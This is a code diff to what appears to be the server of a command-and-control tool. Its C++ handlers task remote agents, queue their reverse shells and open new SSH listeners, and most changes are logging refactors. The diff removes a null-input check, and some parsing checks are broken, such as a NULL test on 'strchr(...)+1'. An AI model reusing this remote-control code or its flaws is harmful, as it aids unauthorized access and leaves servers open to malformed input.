@@ -51,17 +51,7 @@ void ConnectionInstance::manager_handler(){
         operation = atoi(tmpbf);
         ptr += 3;
 
-        sprintf(logbuff, "Manager %s: Operation caught: %d\n", data->id, operation);
-        this->logger->log(logbuff);
-
-        // TODO: FIX THIS?
-        //if(*ptr == '\0'){
-        //    sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", data->id);
-        //    this->logger->log(logbuff);
-        //    this->transport->send_err();
-        //    quitting = 1;
-        //    continue;
-        //}
+        this->logger->log("Manager %s: Operation caught: %d\n", data->id, operation);
 
         // main switch
         switch (operation)
@@ -79,7 +69,7 @@ void ConnectionInstance::manager_handler(){
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
                 sprintf(logbuff, "Wrong format identified from input\n");
-                this->logger->log(logbuff);
+                this->logger->log("Manager %d: Caught wrong format identifier in input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -97,8 +87,7 @@ void ConnectionInstance::manager_handler(){
             // Agent_id is stored in ptr 
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                sprintf(logbuff, "Wrong format identified from input\n");
-                this->logger->log(logbuff);
+                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -118,8 +107,7 @@ void ConnectionInstance::manager_handler(){
             // by the end, filename is in d_ptr and agent is in dat_ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                sprintf(logbuff, "Wrong format identified from input\n");
-                this->logger->log(logbuff);
+                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -131,8 +119,7 @@ void ConnectionInstance::manager_handler(){
         case MANAG_TASK_SC:
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                sprintf(logbuff, "Wrong format identified from input\n");
-                this->logger->log(logbuff);
+                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -145,8 +132,7 @@ void ConnectionInstance::manager_handler(){
         case MANAG_GET_AGENT:
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                sprintf(logbuff, "Wrong format identified from input\n");
-                this->logger->log(logbuff);
+                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -173,9 +159,12 @@ void ConnectionInstance::manager_handler(){
             this->transport->init_reverse_shell(ptr);
             break;
 
+        case MANAG_START_TRANSPORT:
+            this->setup_transport(ptr);
+            break;
+
         default:
-            sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", data->id, operation); 
-            this->logger->log(logbuff);
+            this->logger->log("Manager %s: Unknown operation value '%d'\n", this->data->id, operation);
             this->transport->send_err();
             break;
         }
@@ -240,24 +229,13 @@ void ConnectionInstance::agent_handler(){
                 NULL
         */
 
-        sprintf(logbuff, "Client %s: Operation caught: %d\n", data->id, operation);
-        this->logger->log(logbuff);
-
-        // checks if illegal options 
-        // TODO: FIX THIS???
-        if(*ptr == '\0'){
-            sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", data->id);
-            this->logger->log(logbuff);
-            this->transport->send_err();
-            quitting = 1;
-            continue;
-        }
+        this->logger->log("Client %s: Operation caught: %d\n", this->data->id, operation);
 
         // main decision switch
         switch (operation)
         {
         case AGENT_EXIT:
-            printf("Client %s: Client exiting...\n", data->id); 
+            this->logger->log("Client %s: Client exiting...\n", data->id); 
             quitting = 1;
             break;
 
@@ -271,7 +249,7 @@ void ConnectionInstance::agent_handler(){
             break;
 
         case AGENT_REV_SHELL:
-            printf("Agent reverse shell caught\n");
+            this->logger->log("Client %s: Agent reverse shell caught\n", this->data->id);
             this->server->get_shell_queue()->push(this);
             this->reverse_shell();
             break;
@@ -282,8 +260,7 @@ void ConnectionInstance::agent_handler(){
             break;
 
         default:
-            sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", data->id, operation); 
-            this->logger->log(logbuff);
+            this->logger->log("Client %s: Unknown Operation Identifier: '%d'\n", this->data->id, operation);
             this->transport->send_err();
             break;
         }
@@ -299,6 +276,8 @@ void ConnectionInstance::shell_finish(){
 /*Initialized the connection and prepares data structures for handlers*/
 void *ConnectionInstance::handle_connection(void *input){
     class ConnectionInstance *instance = (class ConnectionInstance *)input;
+
+    instance->get_transport()->listen();
 
     // creates classes and instances
     int handler = instance->transport->determine_handler();
@@ -316,9 +295,27 @@ void *ConnectionInstance::handle_connection(void *input){
     } else
     {
         // failed to handle the parsing :)
-        printf("Woops got an unknown type: %d\n", handler);
+        instance->logger->log("Connection Instance %d: Got Unknown Handler Type: %d\n", 0, handler);
     }
     return NULL;
+}
+
+void ConnectionInstance::setup_transport(char *num){
+    class ServerTransport *transport;
+    class ConnectionInstance *instance = new ConnectionInstance(this->server);
+    int transport_type = atoi(num);
+    switch (transport_type)
+    {
+    case TRANSPORT_SSH:
+        transport = new Ssh_Transport(instance);
+        this->server->add_instance(instance);
+        this->server->listen_instance(instance);
+        break;
+    
+    default:
+        this->logger->log("Manager %s: Failed to identify transport ID %d\n", this->data->id, transport_type);
+        break;
+    }
 }
 
 /*Sets the transport for the connection instance*/
